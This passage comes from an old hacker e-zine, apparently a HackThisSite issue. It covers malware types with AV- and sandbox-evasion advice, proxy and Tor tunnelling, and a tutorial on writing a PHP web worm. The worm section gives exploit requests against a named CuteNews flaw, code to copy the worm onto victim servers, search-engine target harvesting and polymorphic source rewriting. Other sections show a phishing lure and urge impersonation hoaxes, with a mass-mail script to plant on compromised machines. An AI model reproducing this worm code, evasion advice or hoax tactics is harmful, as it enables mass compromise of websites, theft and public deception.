dangerous payload, either they are disguised worms, virii, spyware, logic bombs,
or RAT's (Remote Administration Tools).

IV) Spyware.

These are the new players in today's cyber-battlefields. Spyware is a term for
any piece of software that monitors the victim's habits, from surfing habits to
chat passwords, to banking passwords to full scale corporate espionage.

V) Logic Bombs.

Quite rare, Logic Bombs are programs that triger when a certain event happens
(or doesn't happen). When you are the victim of a logic bomb, you know that
someone is really after you, because they don't spread in the wild. Logic bombs
are commonly created by disgruntled programmers who didn't receive their
payment, or are afraid they won't receive it. A logic bomb triggers when certain
conditions are met, like a date, or the deletion of a certain file. Imagine a
programmer works somewhere, and he installs a LB that requires him to enter a
password every month, else it will erase the entire box' harddrive. When the
programmer gets fired, he can't enter the password, and the company loses all
the data on the programmer's box.

0->2) Types of malware.

I) Virii.

a) Overwriters, these are quite common in the viral world. They just replace the
hostprogram with themselves, erasing the program.

b) Companions, these virii don't alter the hostfile, they hide them from the
user and rename them, taking their place and executing the host after they are
done.

c) Bootsector virii, these virii infect a HD or floppy bootsector, initiating
themselves at each startup, without user interaction, making them quite
powerfull.

d) Prependers, these virii place their code in front of the victim code,
executing themselves before the victim code can, thus not notifying the victim
of missing files.

e) Appenders, the same as prependers, only they execute after the victim code.

f) Memory-resident, these type of virii use TSR techniques (Terminate and Stay
Resident), to remain in the box' memory (usually by interupt hooking) until
something happens (a .exe file is opened) and then they infect files this way.

g) Encrypted virii, to fool scanners in the old days, virii used to encrypt
their opcode bodies, and decrypted themselves during runtime. This technique has
evolved a long way (see below).

h) Oligomorphic virii, these virii are encrypted virii, who change their
decryption/encryption key at every replication, thus making it harder for a
virus scanner to detect them.

i) Polymorphic virii, a quite advanced technique, these little devils substitute
whole opcode blocks with blocks that look different, but do the same.

j) Metamorphic virii, one of the newest techniques to fool AV's, these virii
replace entire blocks of logic in their bodies. They replace 3 with (1+2) or (6
/ 2) or (((2 * 2) +2) / 2) for example.

k) EPO virii, entry point obscuring (or obfuscating) virii place their code body
somewhere random inside the host's body, and modify the host to jump to the
point where the virus starts, thus forcing AV's to scan entire files, slowing
them down.

l) Cross-infection virii, these virii infect multiple file types, thus
increasing their effectiveness.

m) Cryptovirii, these are relatively rare, encoding entire harddrives with  a
publickey algorithm, and forcing the victim to pay the viruswriter ransommoney
to decode his/her HD (also called Ransomware).

II) Worms.

a) Massmailing, these worms harvest e-mail adresses from a box (either from WAB
files, messenger contact lists or other addressbook files) and mail themselves
to them to propagate, they will travel around the world really quick, but will
attract virusanalyst's attention really quickely too, making them somewhat blasŽ
(and unsubtle) in my opinion.

b) P2P, these worms spread trough peer-to-peer software, propagating as popular
filenames (music, movies, pictures, programs, etc), these could go nearly as
fast as Massmailers (as long as they make sure they keep propagating as files
that are still popular) and far more silent.

c) I-Worms, Internet worms are a special case, the very first worm, the
morris-worm, was also an internetworm, but it took more than 15 years before the
second I-Worm appeared. I-Worms are often referred to as Warhol-worms, derived
from Warhol's prediction that in the future everybody will be famous for 15
minutes. I-Worms travel by exploiting security gaps, like Morris' sendmail bug.
Code-Red,Nimda, Sasser and Zotob are all Warhol worms (I-worms) and are
extremely successfull.

d) Botnet worms, these worms function a bit as a trojan too. They use the
victim's box as a zombie, allowing the attacker to remotely use the victim's pc
to send spam, log passwords and launch ddos attacks.

e) Neural-Network worms, I have never heard of one seen in the wild, just as a
poc (proof of concept). Often referred to as Curious Yellow worms, these worms
communicate with each other in order to exchange information over possible
victims, new exploits to use to propagate and new anti-antivirus techniques.
These worms could harbor a self-improving/self-rewriting mechanism, making them
virtually invincible. But it would take a group of very experienced A.I.
Scientists to code such a worm.

III) Trojans.

a) R.A.T's

The most popular of trojans, these programs allow an attacker to remotely
control the infected box, gathering sensitive info, or using it to launch ddos
attacks, use it as a tunnel to root other boxes or to anonymously launch new
viral epedemics.

b) Rootkits

I don't know if these can be considered trojans, but they are (in my opinion)
best classified here. Rootkits allow a remote attacker stealthy access to a box,
hiding processes, directories, files and extra accounts.

b) other

Any program, disguising itself as something else, could be considered a trojan.

IV) Spyware

a) Homepage/Searchpage Hijackers

These programs change your homepage and searchpage to a page of the author's
choice.

b) Dialers

Dialers abuse the victim's dialup connection to dial to a very expensive number
somewhere abroad, generating money for the author.

c) Habit-trackers

These programs track your surfing-habits, advertising things you ( according to
your surfing) want.

d) Keyloggers

Could also be classified under trojans. Keyloggers monitor your keystrokes,
stealing your passwords and sending them to a remote attacker for his goals.

V) Logic Bombs

see explanation in 0->1.



1) Abstract concepts

Now we know some basic malware concepts, we can delve further in theory about
malware development.

1->1) Survival Concept

First we need to know what is important for malware to survive. Well, here are
some important things:

I) Spreading

The most important feature of most malware is to spread as far as possible,
infecting a lot of files/boxes.

II) Efficiency

Doing what it is designed for is of course extremely important. For some worms
it would be taking down a website, or for spyware it would be monitoring surfer
habits.

III) Stealth

Not being detected by AV's is crucial in surviving. If malware is detected it
soon becomes unusable and dies.

1->2) Survival Theory

I) Spreading

Spreading can be done in many ways. As described in 0->2, malware can take on
many propagation forms. Very important when spreading is a part of
social-engeneering. Sending a mass-mail like:

----------start of mail---------------------

Subject: dfjadsad

Body: Hi, open the attachment

Attachment: blah.exe

--------end of mail---------------------

wouldn't attact many people. It is boring. A mail like this however:

----------start of mail---------------------

Subject: Your Credit Card has been charged

Body: 
Dear recipient@provider.com,

Your purchase of the $1000 bodyset-deluxe was sucessfull, your credit-card has
been charged accordingly, check
the attachment for details.

Yours sincerly,

The E-Bay team.

Attachment: Details.doc.exe

--------end of mail---------------------

would attract more people, they would be eager to see what has happened to them,
nobody wants to be
charged for something they haven't bought.

This goes for the P2P way too, files like StarWars - Revengeofthesith.avi.exe
spread faster than blah.exe.
Also, most people feel more secure if a file is zipped. Well, including a
zip-component in your malware, to zip it everytime it replicates isn't that
difficult.

II) Efficiency

There always needs to be a delicate balance between spreading,stealth and
efficincy. Spreading like mad will get your malware very far, but it will be
detected in a matter of hours, making it obsolete, while extreme stealth might
keep your malware undetected for years, but it won't infect more than 10 boxes.
Being efficint totally depends on your goals.

III) Stealth

Malware has many enemies, here are some of them:

a) AV's
b) Firewalls
c) AV researchers

fooling AV's isn't too dificult, sometimes switching two or three bytes is
enough to fool them, but your virus will get detected again and all will be for
nope.
So you need to protect your malware from AV's. Thus
encryption,Oligomorphism,Polymorphism and Metamorphism are born. For all
cryptographers out there, let go of the classic idea of encryption, Viral
encryption is something different. Encryption,Polymorphism,Oligomorphism and
Metamorphism for executables is only possible in assembly, so start learning it!

Fooling firewalls can also be done quite easily, just terminate their processes!
Although this is quite rude and unsubtle, it is effective. A more subtle way is
adding your program to their trustedprogram-list.

Fooling an AV researcher can be quite difficult. They will disassemble your
virus, Emulate it's code and Sandbox it. Making your virus extremely complex,
with long loops and jumps will keep them from fully understanding it by
disassembly. Stopping Emulation is quite difficult, you would have to check if
your code is being emulated by making a change, and checking if that change
really has been applied, if not, you are being emulated. Sandboxing is a
tehcnique that involves putting your virus in a virtual machine with some
baitfiles to see what it does. This could be overcome by checking for VMware,
Virtual Pc, etc. I will give details later.

2) Code Practice.

Before starting this section I assume the reader is familiar with standard
programming theory,viral theory and several (script)languages, such as
c++,Pascal,Vbs,Js, batch and some assembler would help too. All assembler source
examples will be in 16-bit assembler, since these are mainly for educational
purposes, their outdated nature will nearly automatically SK-Proof it, however,
anyone familiar with 16/32- bit assembler can convert the examples to suit the
win32 platform.
This section will contain viral code. I am not responsible for any damage done
by any of these programs, nor do I promote releasing them. I have divided the
Code Practice in several sections as follows:

I) Simple Exe Virii
II) Batch Virii
III)Script Virii
IV) Moderate ExeVirii/Worms
V) Concept Virii

( Sample code can be found online at http://www.hackthissite.org/zine/ )

[ ---------------------------------------------------------------------------- ]
[ proxy chaining, tunnelling and tor................. by outthere and kuroishi ]
[ ---------------------------------------------------------------------------- ]

The creation of anonymous networks like Tor based on assymetric key
cryptography and onion routers do make traditional proxy services seem rather
old fashioned, but traditional anonymous proxy services are still quite useful
for IRC, jump boxes, and general internet tomfoolery, despite the threats from
honeypots.

A proxy is a piece of software that makes requests on behalf of a client to
remote resources. This article goes into short, practical summaries of several
prevelent proxy protocols available accross the internet. Authorization and
identification procedures are mostly ignored, since open proxies are so common
and to keep the article short and practical.

=== CGI Proxies ===
CGI proxies simply fetch web pages and occasionally FTP or other data based on
user-supplied input, which is usually just a GET variable. For example,
  http://foo.bar/p.php?url=http://www.hackthissite.org/
The reliability and transfer rates of these services are often quite high, and
can be easily strung together directly from the URL in many cases, like so:
  http://foo.bar/p.php?url=http://bar.foo/url.cgi?u=http://www.hackthissite.org/
Many language translators also function in this capacity, but unfortunately they
often send an X-Forwarded-For header identifying the sender's IP address.

=== HTTP Proxies ===
HTTP Proxies are pretty simple. The client sends a regular HTTP request to the
proxy server with an absolute URI. Therefore, what would normally be:
  GET / HTTP/1.1
  Host: www.hackthissite.org
    
when connecting directly to the hackthissite.org server becomes:
  GET http://www.hackthissite.org/
  Host: www.hackthissite.org
    
when connecting through a proxy. A blank line after the last header establishes
the end of the request (unless a Content-Length has been specified, as is
typical for a POST). The request then goes right on through as if the
destination had been directly connected to. Easy.

Unfortunately, some http proxies are configured to send certain personally
identifying information to the remote systems.
  * Transparent proxies send the client IP address in the X-Forwarded-For
    header and other headers affirming the use of a proxy server.
  * Anonymous proxies send out headers stating that the server is a proxy, but
    don't send out the client's IP address.
  * High anomnity, or ""elite"" proxies don't send out any information that
    identifies the service as a proxy to the destination.

=== HTTP CONNECT ===
Connect proxies were created as an extension to HTTP proxies as a means for
establishing persistent connections for protocols such as IRC. They are
relatively simple as well. For instance:
  CONNECT irc.hackthissite.org:6667 HTTP/1.1
    
will establish a connection to the HTS IRC server on port 6667. The server will
reply with an HTTP-formatted status message, and if the request was successful,
data can be sent and received freely. Because connect is an extention to the
HTTP protocol, adding extra lines like a Host or a User-Agent will work just
fine, but for most purposes is unnecessary.

=== SOCKS4 ===
Socks4a is an extension to the original socks4 to provide DNS lookup at the
proxy side. First, the client sends a request like so:
  * \x04 - socks4 version identifier
  * \x01 - command; 1 is connect
  * \x00\x50 - port expressed as 16 bit big endian: \x00\x50 would be port 80
      In Perl, pack(""n"", $port) will convert the integer $port to 16 bit big
      endian.
  * \xc0\xa8\x06\x47 - 4 bytes specifying the destination IPv4 address: the 4
      bytes shown would equate to 192.168.6.71. Use \x00\x00\x00\x01 if the
      proxy is to do the DNS lookup itself. (Any non-zero for the last octet
      will do.)
  * rawr\x00 - null-terminated USERID string, these are occasionally compared to
      IP addresses or IDENT replies as a primative form of authentication, but
      rarely. Most of the time this string is ignored, so put something random.
  * hackthissite.org\x00 - null-terminated domain name, just a null byte if a
      valid IP was provided earlier
The socks4 server then sends a reply like so:
  * \x00 - version of the reply code, should always be 0
  * \x5A - request granted
    OR \x5B - rejected or failed
    OR \x5C - rejected because can't connect to identd on the client
    OR \x5D - rejected because identd and the client report different IDs
  * \x00\x50 - destination port, ignore
  * \xc0\xa8\x06\x47 - destination IP, ignore
After these steps write directly to the socket as if the client was directly
connected.

=== SOCKS5 ===
Socks5 was developed to provide both UDP and TCP, strong authentication, DNS,
and IPv6 from the ground up. First off, the client sends a version
identifier/method selection message:
  * \x05 - socks5 version identifier
  * \x01 - number of methods to try; for our purposes, one will suffice
  * \x00 - methods; \x00 is no authentication required
The server will then reply:
  * \x05 - socks5 version identifier
  * \x00 - selected method; if this is \xff then the client must disconnect
If everything went well, the client then sends a socks5 request:
  * \x05 - socks5 version identifier
  * \x01 - command (\x01 for connect)
  * \x00 - reserved, leave null for now
  * \x01 - address type, \x01 for IPv4
    OR \x03 - for a domain name
    OR \x04 - for IPv6
  * \xc0\xa8\x06\x47 - 4 octets specifying the address for IPv4
    OR 16 octets for an IPv6 address
    OR 1 byte specifying the string length then the domain name for DNS
  * \x00\x50 - destination port, \x00\x50 is port 80
The server replies with:
  * \x05 - socks5 version
  * \x00 - reply field, \x00 for successful
    OR \x01 for general socks server failure
    OR \x02 for connection not allowed
    OR \x03 for network unreachable
    OR \x04 for host unreachable
    OR \x05 for connection refused
    OR \x06 for time to live expired
    OR \x07 for command not supported
    OR \x08 for address type not supported
    OR \x09 to \xff for unassigned
  * \x00 - reserved, always \x00
  * \x01 - address type, same values as in request
  * \xc0\xa8\x06\x47 - bound address
  * \x00\x50 - bound port, doesn't really matter for a connect request
Then the transaction continues as if the client were directly connected.  

=== Chains, Final Notes ===
For added anomnity, multiple proxies can be strung together in a process known
as chaining. In proxy chains, the client instructs proxy servers to connect to
subsequent proxy servers until the destination. This technique can greatly
improve anomnity, but may decrease throughput and increase latency.

Interestingly, Tor is nothing more than a socks4a proxy service as far as the
client is concerned, which brings in the possibility of using Tor conceptually
as just another link in a chain. Extending Tor exit nodes with open proxies
also opens up the possibility of getting around Tor restrictions on some
networks while maintaining encryption and anomnity, as it is much easier to
block Tor than to block the massive number of open proxies on the internet,
especially those on non-standard ports.

Reader, beware. Many proxies are run by phishers, over-zealous network
administrators, or law enforcement agencies that log everything. Always use more
than one layer of anomnity and never send unencrypted personally identifyable
information through public proxy servers.

http://proxy-glue.sourceforge.net/

[------------------------------------------------------------------------------]
[ tunnelling and tor ................................................ kuroishi ]
[------------------------------------------------------------------------------]

Tor is the Onion Routing Protocol, a project being developed by the Electronic
Freedom Frontier (EFF) for anonymity and privacy protection on the internet.  It
breaks up your packets and spreads them over the entire Tor network, encrypted,
to end points around the world, where they are reassembled and sent to their
intended destination.  Tor can be used to protect your identity when browsing
the web, chatting, or when doing super fun no-no stuffs ;D.

First, install Tor.  Tor is available from the EFF, at tor.eff.org.  Set it up
on your OS of choice.  You'll also probably want Privoxy, instructions on
configuring your HTTP Proxy (privoxy) to use a SOCKS proxy (tor), see the Tor
website.

To use Tor to anonymize your web browsing, open your browsers proxy settings.
If you're using both Tor and Privoxy you'll want to point your http proxy to
localhost, port 8118. If you're using Firefox, you'll want to check the box that
says ""Use the same proxy for all protocols.""  If you're not using Privoxy (just
Tor), set your SOCKS v4 proxy to localhost, port 9050.  Check if it's working by
going to http://whatismyip.com.  (a note for Firefox users: there is a handy
Firefox extension called ProxyButton.  It allows you to toggle your proxy on and
off quickly from your toolbar.  I recommend this extension if your doing serious
webhacking ;D)

You can set up other applications to route traffic through tor. Direct SOCKS
proxies through localhost port 9050.  But sometimes you may want to use Tor for
an application that does not have SOCKS support, that's where socat comes in
handy.  Socat is a useful tool for dealing with socket connections and tunnels.
I've written a quick script, called torbind to handle socat for us.

#!/bin/bash
# Usage: ./torbind [local port] [remote host] [remote port]
socat TCP4-LISTEN:$1,fork SOCKS4A:localhost:$2:$3,socksport=9050

Say we want to telnet to a remote host over tor.  Using socat we could do this:
	
$ ./torbind 1337 h4x3db0x0r.com 12345&; telnet localhost 1337
Connected to h4x3db0x0r.com port 12345.
Password?:
	
or IRC:
	
$ ./torbind 7000 irc.hackthissite.org 7000&; irssi
/server -ssl localhost 7000
	
You can route any port on local host to any port on any destination through tor.
You can figure out how to use this on your own ;D.

Say your hacking on the road.  You need to use a library or university computer
to do some serious buisness.  You can't install Tor due to certain restrictions,
or just due to time.  A nice quick n' dirty way of getting anonymous protection
is to use an SSH tunnel.  Any SSH client can route traffic through a SOCKS
tunnel to your ssh server.  If you have Tor and Privoxy running on your server
you can route your traffic out through that.  In Linux or MacOS just do for
example:

user@localhost $ ssh -L12345:localhost:8118 user@remotehost.com
Password:
user@remotehost.com $

Back at localhost you can now set your http proxies to localhost:12345.  This
will bounce traffic through your ssh session to your server, and out through Tor
for complete quick anonymity.

In windows, you can set up an SSH tunnel using PuTTY.

In PuTTY Config, under SSH, go to Tunnels and Add a new forwarded port, set
source port, like above something arbitrary, say 12345.  Destination should be
localhost:8118 (for Privoxy, without privoxy, use port 9050, for SOCKS.)  Now
connect to your SSH server, authenticate, and you should be able to set your
HTTP or SOCKS proxy to localhost, port 12345.

You also configure the unix command line ssh client to bounce through tor.
Install connect.c at /usr/local/bin/connect and add the following to your
ssh_config file. Alternatively, you can write shell scripts to automate the
process of alternating between tor ssh and non tor ssh.

Host *
ProxyCommand /usr/local/bin/connect -4 -S 127.0.0.1:9050 %h %p
(needs to have /usr/local/bin/connect )

sshtor.sh:
#!/bin/bash
cp /sw/etc/ssh/ssh_config.tor /sw/etc/ssh/ssh_config

sshnontor.sh:
#!/bin/bash
cp /sw/etc/ssh/ssh_config.nontor /sw/etc/ssh/ssh_config

                                !!!!!!!!!!!!!!!!
                                !!!  ACTION  !!!
                                !!!!!!!!!!!!!!!!                                

[------------------------------------------------------------------------------]
[ the art of writing a web worm in php ....................................... ]
[------------------------------------------------------------------------------]

* Introduction
* Automation
* Target Gathering
* Evading IDS, Polymorphism, and Communication
* Final Words

**** Introduction *****
This article uses some specific examples from an unreleased web worm that would
spread itself through vulnerable php scripts. The worm is called World Cant Wait
and would post an announcement of the November 2nd Drive Out the Bush Regime
protests on thousands of message boards and blog engines. The original made use
of a private vulnerability but the techniques described here use the recently
disclosed php code execution vulnerability in CuteNews 1.4. We were playing
around with automating this exploit to find targets and replicate itself as a
programming exercise while we were toying with the idea of covertly releasing it
in the buildup to the protests to get people to the streets and give teeth to
the movement. In the end we decided that instead of risking legal complications
and trashing a bunch of systems, we would strengthen our movement by explaining
the techniques and release the code in modules to help arm future php worm
revolutionaries.

Although we left some intentional bugs and took portions of the code out, the
snippets below can be used to build a destructive worm. Recognize the
implications of getting involved with such actions and don't make ourselves into
the violent and destructive hackers the media tries to paint us as. The beauty
and genius of a worm is in writing the code itself, not how many systems it can
mess with. So let's get to it, and remember - coding is not a crime.

**** Automation ****
Find a vulnerability and write a self-automated target gathering and
exploitation engine. Web based vulnerabilities are predictable, can gather
targets through search engines fairly easily, and can be exploited automatically
by forging a series of HTTP requests.

while ($stop == false) {
  $list = gather_targets();
  for ($i=0;$i<count($list);$i++) {
    echo "" [x] targetting $list[$i]...\n"";
    if (!is_infected($list[$i])) infect($list[$i]);
  }
  $stop = true;
}

In order to have a web based worm spread, you need to automate the exploitation
process. This can be done by using PHP's socket functions to establish
connections to the web server and sending http data. This function demonstrates
how a PHP script can connect to a server, send data, and return the response:

function make_request($domain, $packet) {
  $fp = @fsockopen($domain, 80, $errno, $errstr, 10);
  if (!$fp) return false;
  fwrite($fp, $packet);
  while (!feof($fp)) $text.= fgets($fp);
  fclose($fp);
}

Then it is just a matter of forging a proper HTTP request which will exploit the
vulnerability and get it to run a copy of itself on the infected system.
CuteNews writes information to data/flood.db.php when someone posts comments to
a news article. You can insert PHP code to this file by passing data in the
Client-Ip HTTP header.

$packet = str_replace(""\n"",""\n\r"", 
""POST
$location/example2.php?subaction=showcomments&id=1128188313&archive=&start_from=
&ucat=& HTTP/1.1
Accept: */*\r\nAccept-Language: en
Accept-Encoding: gzip, deflate
Client-Ip: <?php echo \""arbitrary php code to be executed!!\""; ?>
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/412.6
(KHTML, like Gecko) Safari/412.2
Content-Type: application/x-www-form-urlencoded
Content-Length: 107
Connection: close
Host: $domain

name=haxitup&mail=&comments=j00+haxed+%3Alaughing%3A&submit=Add+My+Comment&
subaction=addcomment&ucat=&show=

"";

If we make a couple of these requests, it will write the PHP code from Client-IP
to flood.db.php. Then we can call flood.php from a standard GET request to
execute the code. Now that we can automate the process of executing PHP code on
a given server, we can start thinking about some code that will replicate the
worm as well as delivering our payload. This example will copy the entire worm
code to 'sekret.php' on the vulnerable server, ready to be run. You can add any
payload at the end of Client-Ip, from running sekret.php to adding a line at the
top of news.txt which will make a news post on every vulnerable CuteNews site ;)
;)

$source = str_replace(""\$"", ""\\\$"",str_replace(""\"""", ""\\\"""",str_replace(""\\"",
""\\\\"",file_get_contents($_SERVER['PHP_SELF']))));
...
Client-Ip: <?php \$fp=fopen(\""sekret.php\"", \""w\"");fwrite(\$fp,
\""$source\"");fclose(\$fp); ?>\r\n ...
...
for ($i=0;$i<2;$i++) { $bob = make_request($domain, $packet); }
make_request($domain, ""GET $location/data/flood.db.php HTTP/1.1\r\nHost:
$domain\r\nConnection: close\r\n\r\n"");

Other Infection Method: PHP Inclusion
It is not difficult to automate the process of PHP include related
vulnerabilities either. Poorly written PHP scripts commonly have bits of code
similar to <?php include $page; ?>, which is vulnerable in many situations to
remote PHP code execution by passing the URL to a bit of PHP code as the GET
variable 'page'. Our worm can copy itself to some place on the web root and pass
the URL to an HTTP GET request to execute itself on another server.

$fp = fopen(""sekret.txt"", ""w"");
fwrite($fp, file_get_contents($_SERVER['PHP_SELF']));
fclose($fp);
$url = $_SERVER['SCRIPT_URI'];
make_request($domain, ""GET /test.php?path=$url HTTP/1.1\r\nHost:
$domain\r\nConnection: close\r\n\r\n"");

Other Infection Method: SQL
Other Infection Method: JavaScript / XSS

**** 3. Target Gathering ****

During the development of the worm, it would be wise to seperate the actual
exploit code from the target gathering code. Test on your own machine or on a
LAN using code similar to:

function gather_targets() {
  return array(""http://localhost/cutenews"");
}

For the purposes of web based worms, it makes sense to use search engines in
order to extract potential targets. You can easily write a few queries that will
produce URLs to sites running specific software. This can be automated through
page scraping code to generate an array of targets which can be passed to your
worm for infection.

  $search = array(""inurl:flood.db.php"", ""\""powered by cutenews v1.3\"""",
""\""/cutenews/remote_headlines.php\"""", ""\""powered by CuteNews\"" \""2003..2005
CutePHP\"""",  ""inurl:\""/newsarchive.php?archive\"""");
  $query = $search[rand(0, count($search)-1)];
  
You can scrape results from major search engines by making HTTP requests and
looking at the returned URLs.

  $fp = fsockopen(""google.com"", ""80"");
  fwrite($fp, ""GET /search?q="" . urlencode($query) .
""&sourceid=mozilla-search&start=0&start=0&ie=utf-8&oe=utf-8&client=firefox-a&rls
=org.mozilla:en-US:official HTTP/1.1\r\n
Host: www.google.com\r\n
User-Agent: Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.7.8)
Gecko/20050511/1.0.4\r\n
Accept:
text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
image/png,*/*;q=0.5\r\n
Accept-Language: en-us,en;q=0.5\r\n
Accept-Encoding: gzip,deflate\r\n
Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n
Connection: close\r\n\r\n"");
  while (!feof($fp) AND (strpos($text, ""2005 Google"") === false)) {
    $text.= fgets($fp);
  }
  fclose($fp);
  
  while (!(strpos($text, ""<a href=\""http://"") === false)) {
    $starttext = substr($text, strpos($text, ""<a href=\""http://"") + 9);
    $thenumber = substr($starttext, 0, strpos($starttext, ""\""""));
    $text = str_replace(""<a href=\""$thenumber\"">"", ""x"", $text);   
    if (strpos($thenumber, ""google"") === false) $vuln[] = $thenumber;
  }  
  print_r($vuln);

**** Evading IDS, Polymorphism, and Communication ****
You can adjust the source of the program on the fly by making several find and
replaces in the code for each new iteration of the worm. PHP and other languages
have several function aliases that can be swapped to produce the same results.
Consider adding extroneous PHP code as trash to confuse file sizes and coding
similarities. In addition to changing the names of variables in the program, you
can also express values of numbers and strings in different ways. 

$random++;              ->        $random+= -2 + 3;
$start = ""go"";          ->        $start = chr(103) . chr(111);
$num = count($result);  ->        $num = sizeof($result);

The following bit of code published in 29a rewrites the source using new
variable names.

<?php
$changevars=array('changevars', 'content', 'newvars', 'counti','countj',
'trash');
srand((double)microtime()*1000000);
$content=fread(fopen(__FILE__,'r'),filesize(__FILE__));
$counti=0;
while($changevars[$counti]) {
  $content=str_replace($changevars[++$counti], trash('',0), $content);
}
fwrite(fopen(__FILE__,'w'),$content);

function trash($newvar, $countj) {
  do { $newvar.=chr(rand(97,122)); } while (++$countj<rand(5,15));
  return $newvar;
}
?>

Randomizing data sent in the http request, making it less predictable. You can
include and choose a random user-agent making it look like real users. Or you
can adjust the actual POST data so that they aren't all using the same values
for each form name (like the above cutenews example). 

If your worm depends on a search engine like google to gather targets, it might
be worth considering diversifying your queries as to reduce the chances of being
blacklisted and killing the worm. inurl might find a lot of pages, but intitle
works as well. Consider randomizing the user-agent of your http requests or
integrating multiple search engine support to keep them confused and extend the
duration of the worm.

Develop methods of communicating with past and future iterations of the worm,
feeding it locations of attacked boxes. A decentralized method of interworm
communication can also help the worm adapt itself by discovering(fuzzing) new
exploits or being fed new attack vectors. 

**** Final Words ****
World Cant Wait was developed as a simple proof-of-concept in the world of
writing web based worms that spread through vulnerable php scripts. Although the
worm code was not designed to trash systems (the above code won't even work
without some modification) the concepts can be used to deliver all sorts of
payloads. Script kiddie worms have in the past been used to gather jumpboxes,
harvest passwords, or ddos major systems, while others have actually went and
patched the security hole of the vulnerable software. Others are toying with the
idea of making mass amounts of posts on guestbooks, blogs, and message boards to
google bomb and manipulate google and other spidering systems. The possibilities
are endless, and the real genius is in creativity. 

Most people interested in advanced coding exercises such as writing worms are
motivated by the challenge of actually developing efficient code to automate the
art of gathering targets and exploiting them. There is no greater and more
beautiful coding exercise for efficiency and complexity than coding a worm. Even
if writing code can be considered a criminal act in the eyes of the state,
interest in this beautiful art has been around for decades and will always
remain a part of hacker culture as long as we are able to develop them in a
secure and responsible way. 

[------------------------------------------------------------------------------]
[ creating national media stunts ............................................. ]
[------------------------------------------------------------------------------]

coordinate with other national actions, events, protests. find something that
will already be on people's mind and add fuel to the flames. 

cause electronic disruption: announce a phony mayor resignation, pose as your
boss announcing raises for everybody, give people discounts for phone gas
internet or public transit services.

make mass announcements to mainstream and independent media to publicize your
actions. write a well formatted press announcement look up and contact reporters
or other members of the press. mass communication(gather media lists and send
mass emails, post to indymedia, upload files to p2p networks, file drops, or
other popular archive sites. 

cover your tracks, never use the same name twice, don't compromise with white
hats or sellouts, embrace a diversity of tactics, have fun and don't get caught!
  

Mass Mail Script: drop on a box and create a newline-seperated text file full of
emails to major newspapers, televiion and radio stations, congress, etc. 

<?php
$fromemail = ""Name Here <never@guess>"";
$subject = ""insert subject here!"";
$message = ""insert\nmessage\nhere!"";
$handle = fopen(""emails.txt"", ""r"");
while (!feof($handle)) {
  $buffer = fgets($handle, 4096);
  if ($buffer != """" AND $buffer != ""\n"") {
    echo ""Send to $buffer...\n"";
    $a = mail ($buffer, $subject, $message, ""From: $fromemail"");
    if ($a == false) echo ""<font color=\""red\"">Bad!</font> \n"";
    echo ""Done.<br>"";
  }
}
fclose($handle); ?><br><br>done altogether!

  
""France's Youth Battles Also Waged on the Web""
Washington Post, November 10, 2005

While riot police are attempting to curb the gangs that have been setting fire
to cars and buildings in France's poor suburban communities for the past two
weeks, French officials have only just begun the struggle to control a more
amorphous battleground: cyberspace.

Internet blogs have become so vicious and intense that police have opened
investigations against two teenagers for inciting violence on radio
station-sponsored blogs. Hackers took over the Web site of the northern Paris
suburb of Clichy-sous-Bois, where the first violence began Oct. 27, and
dispatched thousands of fake e-mails announcing the mayor's resignation. Local
gangs have used text messaging on their cell phones as early warning systems to
alert members about the movements of riot police during operations in their
communities, gang members said in interviews.

""CTA asks feds to probe e-mail hoax""
Chicago Tribune, December 14th 2004

The Chicago Transit Authority today asked the FBI to investigate an e-mail sent
to media outlets early this morning, falsely announcing free CTA rides to the
public on Wednesday. 

The so-called press release went out under CTA President Frank Kruesi's name and
was received by the Tribune and other news media at 3 a.m. It apologizes for
pending service cuts, and ""in the spirit of the holidays"" announces ""One Day of
Free Travel"" on buses and trains beginning 5 a.m. Wednesday.

Nothing could be further from the truth, officials of the transit agency said
today. ""It's phony, and we have referred it to the FBI,"" said CTA spokeswoman
Noelle Gaffney. The e-mail, headlined ""Riders Don't Pay, Workers Don't Collect!""
did not originate with the CTA, and there will be no fare holiday, officials
said.

[------------------------------------------------------------------------------]
[ black and white chicago 2600 ............................................... ]
[------------------------------------------------------------------------------]

After an invitation to test the security of several of their systems we
proceeded to root each of them and showed them how it was done because at the
time they were curious and interested as to how their systems were compromised.
After Jeremy's place was raided by the FBI, the white hats got scared and showed
their true colors, starting to call us 'cyber-criminals' and 'electronic
vandals' and started to work with the FBI and ProtestWarrior to demonize,
harass, and incriminate members of our group. By aiding the forces that work to
destroy the hacking movement, Chicago ""2600"" has lost all credibility as a
public hacking group. 

Over a period of months, several self-appointed Chicago 2600 administrators have
acted in ways which endanger other hackers, abuse their power, and otherwise
undermine the spirit of hacking in general.

* Turned over logs and other information to narc to people's bosses with the
successful intent to get people fired.
* Has worked with law enforcement to provide testimony and freelance
surveillance to aid the FBI's chances of conviction as well as work with
right-wing group ProtestWarrior to do counter-intelligence and public smear
campaigns 
* Repeatedly censor and prevent people from posting to the public email list
when they don't agree with the posts or want to hide some of the stuff they're
doing.
* Run a secret email list for those who ""make the real decisions about the
group"", which they have used to badmouth and conspire against other members
* Moved meetings to a private location where they have banned several people
with threats of going to the police

When approached about these violations, the administrators maintain that ""this
is not a democracy"" and that they can run their ""private company"" any way they
choose. In addition to breaking a number of 2600 conventions, this sort of
egotistical, authoritative philosophy undermines the open democratic spirit of
hacking.

Like many other hacking groups, 2600 has counter-culture roots and has always
embraced dissenting opinions. 2600 has also recognized that hacking is
inherantly political, and how free technology can be used to defend digital
rights and free speech. The Fifth HOPE was held in NYC a month before the
Republican National Convention came to town and had a number of political
presentations covering independent media, the free software movement, and even a
speech talking about civil disobedience at the upcoming RNC protests.

2600 has created a set of national guidelines in order to keep local groups
organized around the principles of freedom and democracy and to prevent
power-hungry administrators to abuse the rest of the group. 

""Remember that meetings are open to all as per the meeting guidelines. Your
meeting CANNOT be ""sponsored"" by anyone or it's not a 2600 meeting. Also, avoid
appearing to be a tight knit group as this will only discourage or intimidate
new attendees. It also would be inaccurate - meetings are no more yours than
they are anybody else's. Similarly, your site should only focus on the meeting
itself, not activities outside of or after the meeting. If you imply that all of
the cool people wind up doing one thing while the non-cool people do something
else, you're creating divisions and factions that have no place here. For the
same reason, we strongly discourage any kind of content that mocks or puts down
any attendee(s).""

